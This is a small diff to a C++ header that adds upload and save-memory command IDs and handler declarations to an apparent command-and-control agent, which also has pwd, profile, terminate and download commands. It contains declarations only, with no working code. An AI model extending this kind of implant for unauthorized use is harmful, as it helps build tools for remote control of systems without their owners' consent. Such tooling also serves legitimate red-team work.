@@ -9,8 +9,10 @@
 #define COMMAND_PWD       4
 #define COMMAND_PROFILE   21
 #define COMMAND_TERMINATE 10
+#define COMMAND_UPLOAD    33
 
-#define COMMAND_ERROR     0x1111ffff
+#define COMMAND_SAVEMEMORY 0x2321
+#define COMMAND_ERROR      0x1111ffff
 
 class Agent;
 
@@ -29,4 +31,7 @@ public:
 	void CmdDownloadState(ULONG commandId, Packer* inPacker, Packer* outPacker);
 	void CmdProfile(ULONG commandId, Packer* inPacker, Packer* outPacker);
 	void CmdPwd(ULONG commandId, Packer* inPacker, Packer* outPacker);
+	void CmdUpload(ULONG commandId, Packer* inPacker, Packer* outPacker);
+
+	void CmdSaveMemory(ULONG commandId, Packer* inPacker, Packer* outPacker);
 };
